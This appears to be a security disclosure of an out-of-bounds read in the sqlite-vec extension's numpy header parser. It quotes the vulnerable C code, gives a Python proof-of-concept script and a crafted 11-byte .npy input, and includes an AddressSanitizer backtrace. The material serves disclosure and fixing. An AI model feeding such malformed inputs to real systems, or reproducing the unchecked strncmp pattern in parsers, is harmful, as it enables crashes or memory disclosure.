version: 0.1.1

tag: OOBR, VectorDB, Parse

https://github.com/asg017/sqlite-vec


A vector search SQLite extension which has 3.6k stars. It can load numpy file.

```c
//https://github.com/asg017/sqlite-vec/blob/main/sqlite-vec.c#L2473C1-L2478C2
void npy_scanner_init(struct NpyScanner *scanner, const unsigned char *source,
                      int source_length) {
  scanner->start = (unsigned char *)source;
  scanner->end = (unsigned char *)source + source_length;
  scanner->ptr = (unsigned char *)source;
}

// https://github.com/asg017/sqlite-vec/blob/main/sqlite-vec.c#L2489C1-L2500C70
int parse_npy_header(sqlite3_vtab *pVTab, const unsigned char *header,
                     size_t headerLength,
                     enum VectorElementType *out_element_type,
                     int *fortran_order, size_t *numElements,
                     size_t *numDimensions) {

  struct NpyScanner scanner;
  struct NpyToken token;
  int rc;
  npy_scanner_init(&scanner, header, headerLength);

  if (npy_scanner_next(&scanner, &token) != VEC0_TOKEN_RESULT_SOME &&  //<-----[1]
    ...
```

The function `parse_npy_header` is used to parse the numpy file. It uses `scanner` to record the position.
`npy_scanner_next` continues to call `npy_token_next`.

```c
//https://github.com/asg017/sqlite-vec/blob/main/sqlite-vec.c#L2390
int npy_token_next(unsigned char *start, unsigned char *end,
                   struct NpyToken *out) {
  unsigned char *ptr = start;
  while (ptr < end) {
    unsigned char curr = *ptr;
    if (is_whitespace(curr)) {
      ptr++;
      continue;
    } else if (curr == '(') {
      ...
    } else if (curr == '\'') {
      ...
    } else if (curr == 'F' && 
               strncmp((char *)ptr, "False", strlen("False")) == 0) {  <-----[2]
      out->start = ptr;
      out->end = (ptr + (int)strlen("False"));
      ptr = out->end;
      out->token_type = NPY_TOKEN_TYPE_FALSE;
      return VEC0_TOKEN_RESULT_SOME;
    } else if (is_digit(curr)) {
        ...
    } else {
      return VEC0_TOKEN_RESULT_ERROR;
    }
  }
  return VEC0_TOKEN_RESULT_ERROR;
}
```

When curr is 'F', it determines at [2] whether the word here is "False", but does not judge the length of the readable data. If the data length is less than strlen("False") at this time, it will cause out-of-bounds data reading.

Poc code:

```python
import sqlite3

def execute_all(cursor, sql, args=None):
    if args is None:
        args = []
    results = cursor.execute(sql, args).fetchall()
    return list(map(lambda x: dict(x), results))

def connect(ext, path=":memory:", extra_entrypoint=None):
    db = sqlite3.connect(path)
    db.enable_load_extension(True)
    db.load_extension(ext)
    db.row_factory = sqlite3.Row
    return db

db = connect("./dist/vec0")

vec_npy_each_f = lambda *args: execute_all(
    db, "select * from vec_npy_each(?)", args
)

with open("./poc.npy", "rb") as f:
    data = f.read()
    print(vec_npy_each_f(data))
```

Poc data:
`00000000: 934e 554d 5059 0111 0100 46              .NUMPY....F`


Poc env:

We should compile with ASAN: `clang -fPIC -shared -Wall -Wextra -g -O0 -lm -lsqlite3 sqlite-vec.c -o dist/vec0.so`.  
Then, install python library sqlite-vec.  
Last, run `LD_PRELOAD=/usr/lib/llvm-14/lib/clang/14.0.0/lib/linux/libclang_rt.asan-x86_64.so python3 poc.py -detect_leaks=0`

Backtrace:
```
=================================================================
==829976==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x60200008a05b at pc 0x55f7de421d3d bp 0x7fff3b7230d0 sp 0x7fff3b722878
READ of size 2 at 0x60200008a05b thread T0
    #0 0x55f7de421d3c in strncmp (/sqlite-vec/poc+0x156d3c) (BuildId: cdf4cb5c526ff050498cc65aa238e9fb9d2938e1)
    #1 0x55f7de8e8209 in npy_token_next /sqlite-vec/sqlite-vec.c:2445:16
    #2 0x55f7de8e87de in npy_scanner_next /sqlite-vec/sqlite-vec.c:2481:12
    #3 0x55f7de8e8aba in parse_npy_header /sqlite-vec/sqlite-vec.c:2500:7
    #4 0x55f7de8eb3df in parse_npy_buffer /sqlite-vec/sqlite-vec.c:2808:12
    #5 0x55f7de91337d in vec_npy_eachFilter /sqlite-vec/sqlite-vec.c:2967:10
    #6 0x55f7de608c5b in sqlite3VdbeExec /sqlite-vec/vendor/sqlite3.c:101441:8
    #7 0x55f7de4fe5cd in sqlite3Step /sqlite-vec/vendor/sqlite3.c:91222:10
    #8 0x55f7de4ea0a4 in sqlite3_step /sqlite-vec/vendor/sqlite3.c:91283:16
```

